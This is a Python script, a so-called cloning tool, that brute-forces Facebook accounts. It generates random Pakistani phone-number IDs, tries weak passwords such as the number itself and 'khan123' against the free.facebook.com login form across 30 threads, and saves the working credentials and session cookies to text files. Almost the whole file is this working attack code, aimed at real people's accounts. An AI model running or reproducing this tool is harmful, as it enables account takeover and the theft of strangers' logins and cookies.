#!/usr/bin/python3
#-*-coding:utf-8-*-
import os

try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')

try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
    
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
    
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
	os.system('python num.py')
  
logo=(f"""
\033[1;36m██████╗  █████╗ ██╗      ██████╗  ██████╗██╗  ██╗
\033[1;33m██╔══██╗██╔══██╗██║     ██╔═══██╗██╔════╝██║  ██║
\033[1;32m██████╔╝███████║██║     ██║   ██║██║     ███████║
\033[1;38m██╔══██╗██╔══██║██║     ██║   ██║██║     ██╔══██║
\033[1;33m██████╔╝██║  ██║███████╗╚██████╔╝╚██████╗██║  ██║  \033[1;36mXD
\033[1;31m╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝                                                    
\033[1;37m══════════════════════════════════════════
\033[1;32m  •   \033[1;33mOWNER\33[0;m        :  MUHAMMAD JUNAID
\033[1;32m  •   \033[1;32mFACEBOK      : MUHAMMAD JUNAID
\033[1;32m  •   \033[1;36mTOOL VIRSION :  0.1
\033[1;37m══════════════════════════════════════════\n""")
loop = 0
ok = []
cp = []
def main():
	os.system("clear")
	print(logo)
	print(47*'\033[92;1m-')
	print(" \x1b[1;95m[1] \x1b[1;95mStart Cloning")
	print(" \x1b[1;96m[2] \x1b[1;96mOwner Contact  ")
	print(" \x1b[1;97m[3] \x1b[1;97mFollow my Facebook account  ")
	print(" \x1b[1;98m[0] \x1b[1;92mExit")
	print(47*'\033[92;1m-')
	baloch_select()

def baloch_select():
	baloch = input('\n\x1b[1;93m[+] Choose Option: \x1b[1;92m')
	if baloch == '':
		print("\x1b[1;91mFill in correctly")
		main()
	elif baloch == '1':
		baloch_TRICKER()
	elif baloch == '2':
		os.system('https://www.facebook.com/XDTOPPER.JUNAID.KHAN')
		main()
	elif baloch == '3':
		os.system('https://www.facebook.com/XDTOPPER.JUNAID.KHAN')
		main()
	elif baloch == '0':
		os.system('exit')
	else:
		print ('\x1b[1;91m[!] Please select a valid option')
		time.sleep(2)
		main()

   
def baloch_TRICKER():
	os.system('clear')
	print(logo)
	os.system('')
	print('\x1b[1;92m[1]\x1b[1;93m Random Cloning')
	print('\x1b[1;92m[0]\x1b[1;94m Back')
	print(47*'\033[92;1m-')
	print ("")
	opt = input('\x1b[1;93m[+] Choose option: \x1b[1;92m')
	if opt =='1':
		method()
	elif opt =='0':
		main()
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		baloch_KING()
		
def method():
	os.system('clear')
	print(logo)
	os.system('')
	print('\x1b[1;92m[1]\x1b[1;93m Method1  \x1b[1;92m[Ok idz] \x1b[1;93m[BEST]')
	print('\x1b[1;92m[2]\x1b[1;94m Method2  \x1b[1;92m[Ok idz]')
	print('\x1b[1;92m[0]\x1b[1;95m Back')
	print(47*'\033[92;1m-')
	print ("")
	opt = input('\x1b[1;93m[+] Choose option: \x1b[1;92m')
	if opt =='1':
		method1()
	elif opt =='2':
		method2()
	elif opt =='0':
		baloch_KING()
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		method()

def method1():
	user=[]
	os.system('clear');print(logo)
	print('\033[1;32m[+] For Example :\033[1;33m 0300,0302,0304,0309 ...')
	print ("")
	kode = input('\033[1;32m[+] Choose Code : \033[1;33m')
	print ("")
	print('\033[1;32m[+] For Example :\033[1;33m 5000,6000,10000 ...')
	print ("")
	limit = int(input('\033[1;32m[+] Idz Limit : \033[1;33m'))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\033[1;32m Total ids: '+tl)
		print("\033[92;1m Brute Has Been Started \x1b[0m")
		print("\033[92;1m To Stop Process Press CTRL + Z\033[93;1m")
		print(50*'\033[92;1m-')
		print(" [\033[1;92m\033[1;41m  Use Airplane mode For Speedup Cloning  \033[0m\033[1;93m]")
		print(50*'\033[92;1m-')
		print ("")
		for guru in user:
			uid = kode+guru
			pwx = [guru,uid,'khan123','khan12345']
			yaari.submit(mcrack,uid,pwx,tl)
	print(47*'\033[92;1m-')
	print ("")
	print('The process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	print(54*'_')
	input('\033[1;32m Press enter to back ')
	baloch_TRICKER()
	
def mcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cp
	global ok
	global agents
	try:
		for ps in pwx:
			agents = ['Dalvik/2.1.0 (Linux; U; Android 13; Samsung Build/TQ2A.898394.016) [FBAN/FB4A;FBAV/117.0.0.34.84;FBBV/130167513;FBRV/0;FBPN/com.facebook.katana;FBLC/fr_FR;FBMF/Samsung;FBBD/Samsung;FBDV/Samsung;FBSV/13;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 8; Samsung Build/OPR4.326384.024) [FBAN/FB4A;FBAV/416.0.0.48.41;FBBV/796742731;FBRV/0;FBPN/com.facebook.katana;FBLC/pt_PT;FBMF/Samsung;FBBD/Samsung;FBDV/Samsung;FBSV/8;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 6; Samsung Build/MVO3BL) [FBAN/FB4A;FBAV/104.0.0.39.69;FBBV/185181259;FBRV/0;FBPN/com.facebook.katana;FBLC/zh_CN;FBMF/Samsung;FBBD/Samsung;FBDV/Samsung;FBSV/6;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 7; Samsung Build/NHQYDL) [FBAN/FB4A;FBAV/152.0.0.18.97;FBBV/181394313;FBRV/0;FBPN/com.facebook.katana;FBLC/pt_PT;FBMF/Samsung;FBBD/Samsung;FBDV/Samsung;FBSV/7;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 5; Samsung Build/LKIBIW) [FBAN/FB4A;FBAV/293.0.0.52.98;FBBV/158061198;FBRV/0;FBPN/com.facebook.katana;FBLC/bn_IN;FBMF/Samsung;FBBD/Samsung;FBDV/Samsung;FBSV/5;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 10; Samsung Build/QQ1B.914320.069) [FBAN/FB4A;FBAV/358.0.0.25.56;FBBV/272513739;FBRV/0;FBPN/com.facebook.katana;FBLC/bn_IN;FBMF/Samsung;FBBD/Samsung;FBDV/Samsung;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 10; Samsung Build/QQ2A.431499.031) [FBAN/FB4A;FBAV/138.0.0.97.77;FBBV/354419374;FBRV/0;FBPN/com.facebook.katana;FBLC/es_LA;FBMF/Samsung;FBBD/Samsung;FBDV/Samsung;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 12; Samsung Build/SD2A.925709.044) [FBAN/FB4A;FBAV/257.0.0.27.20;FBBV/146296658;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_FI;FBMF/Samsung;FBBD/Samsung;FBDV/Samsung;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 6; Samsung Build/MKJTP5) [FBAN/FB4A;FBAV/243.0.0.56.47;FBBV/213004983;FBRV/0;FBPN/com.facebook.katana;FBLC/bn_IN;FBMF/Samsung;FBBD/Samsung;FBDV/Samsung;FBSV/6;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 10; Samsung Build/QQ1D.311154.074) [FBAN/FB4A;FBAV/240.0.0.55.31;FBBV/279270113;FBRV/0;FBPN/com.facebook.katana;FBLC/pt_PT;FBMF/Samsung;FBBD/Samsung;FBDV/Samsung;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]']
			session = requests.Session()
			sys.stdout.write(f'\r \x1b[1;92m[baloch] [%s/%s] [OK][%s] [CP][%s] \r'%(loop,tl,len(ok),len(cp))),
			sys.stdout.flush()
			pro = random.choice(agents)
			free_fb = session.get('https://free.facebook.com/?tbua=1').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority': 'free.facebook.com',
        	'method':'GET',
		    'path': '/',
    'scheme':'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=IiTAZEI_PCo5jbDIASfhpzTb; sb=IiTAZIMo91VcZo9Lz_A-Zd_o; m_pixel_ratio=1.875; wd=384x759; fr=0tuih0oDBurzHGzc9..BkwCQi.WH.AAA.0.0.BkwCQ2.AWVG86Z9AjE',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
			lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print('\33[1;92m[baloch-OK] '+cid+' | '+ps+'\33[0;97m')
				print("\033[1;92m[•] Cookie: "+coki)
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				ok.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print('\33[1;93m[baloch-CP] '+cid+' | '+ps+'\33[0;97m')
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cp.append(cid)
				break
			else:
				continue
		loop+=1
	except:
		pass

def method2():
	user=[]
	os.system('clear');print(logo)
	print('\033[1;32m[+] For Example :\033[1;33m 92310,92342,92300,92301 ...')
	print ("")
	kode = input('\033[1;32m[+] Choose Code : \033[1;33m')
	print ("")
	print('\033[1;32m[+] For Example :\033[1;33m 5000,6000,10000 ...')
	print ("")
	limit = int(input('\033[1;32m[+] Idz Limit : \033[1;33m'))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\033[1;32m Total ids: '+tl)
		print("\033[92;1m Brute Has Been Started \x1b[0m")
		print("\033[92;1m To Stop Process Press CTRL + Z\033[93;1m")
		print(50*'\033[92;1m-')
		print(" [\033[1;92m\033[1;41m  Use Airplane mode For Speedup Cloning  \033[0m\033[1;93m]")
		print(50*'\033[92;1m-')
		print ("")
		for guru in user:
			uid = kode+guru
			pwx = [guru,uid,'khan123','khan12345']
			yaari.submit(mbcrack,uid,pwx,tl)
	print(47*'\033[92;1m-')
	print ("")
	print('The process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	print(54*'_')
	input('\033[1;32m Press enter to back ')
	baloch_TRICKER()
	
def mbcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cp
	global ok
	global baloch
	try:
		for ps in pwx:
			agents =['Mozilla/5.0 (Linux; Android 11; SM-M107F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 GSA/13.14.9.23.arm64Mozilla/5.0 (Linux; Android 11; SM-M107F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 GSA/12.18.11.23.arm64Mozilla/5.0 (Linux; Android 13; SM-M236B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.61 Mobile Safari/537.36 OPX/2.0Mozilla/5.0 (Linux; Android 13; SM-M236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]Mozilla/5.0 (Linux; Android 13; SM-M236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/416.0.0.35.85;]Mozilla/5.0 (Linux; Android 13; SM-M236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/417.0.0.33.65;]Mozilla/5.0 (Linux; Android 12; SM-M236B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]Mozilla/5.0 (Linux; Android 12; SM-M236B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 13; SM-M236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]Mozilla/5.0 (Linux; Android 12; SM-M236B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]Mozilla/5.0 (Linux; Android 13; SM-M236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]Mozilla/5.0 (Linux; Android 12; SM-M236B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]Mozilla/5.0 (Linux; Android 13; SM-M236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]Mozilla/5.0 (Linux; Android 12; SM-M236B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-M236B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 11; ACTAB1022) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Safari/537.36Mozilla/5.0 (Linux; Android 11; BV6600Pro) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 13; 23013PC75G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 12; S98) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 13; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 11; WP15) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 11; Live 9) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 13; TECNO CK7n) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 12; V Max) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 13; SC-51B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36']
			session = requests.Session()
			sys.stdout.write(f'\r \x1b[1;92m[baloch] [%s/%s] [OK][%s] [CP][%s] \r'%(loop,tl,len(ok),len(cp))),
			sys.stdout.flush()
			pro = random.choice(agents)
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority': 'free.facebook.com',
		    'method':'GET',
		    'path': '/',
    'scheme':'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=IiTAZEI_PCo5jbDIASfhpzTb; sb=IiTAZIMo91VcZo9Lz_A-Zd_o; m_pixel_ratio=1.875; wd=384x759; fr=0tuih0oDBurzHGzc9..BkwCQi.WH.AAA.0.0.BkwCQ2.AWVG86Z9AjE',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
			lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print(' \033[1;32m[baloch-OK] '+cid+' | '+ps+'\033[1;32m')
				print("\033[1;92m[•] Cookie: "+coki)
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				ok.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print(' \033[1;33m[baloch-CP] '+cid+' | '+ps+'\033[0;97m')
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cp.append(cid)
				break
			else:
				continue
		loop+=1
	except:
		pass
	
if __name__=='__main__':
	main()
